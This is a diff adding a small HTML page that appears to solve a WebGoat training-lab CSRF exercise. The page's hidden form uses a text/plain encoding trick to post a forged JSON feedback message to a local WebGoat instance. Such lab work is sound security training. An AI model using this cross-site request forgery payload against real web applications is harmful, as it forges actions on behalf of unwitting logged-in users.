@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head> 
+    
+<body>
+    <h1>Vi Quốc Thuận</h1>
+
+    <!-- {"name":"WebGoat", "email":"webgoat@webgoat.org", "content":"WebGoat is the best!!"} -->
+    <img src="https://github.com/WebGoat.png">
+
+    <form action="http://127.0.0.1:8080/WebGoat/csrf/feedback/message" method="POST" enctype="text/plain">
+        <!-- <input type="hidden" name='{"name":"WebGoat", "email":"webgoat@webgoat.org", "content":"WebGoat is the best!!' value='"}'> -->
+         <input type="hidden" name='{"name":"WebGoat", "email":"webgoat@webgoat.org", "content":"WebGoat is the best!!' value='"}'>
+        <input type="submit" value="Submit">
+    </form>
+</body>
+</html>
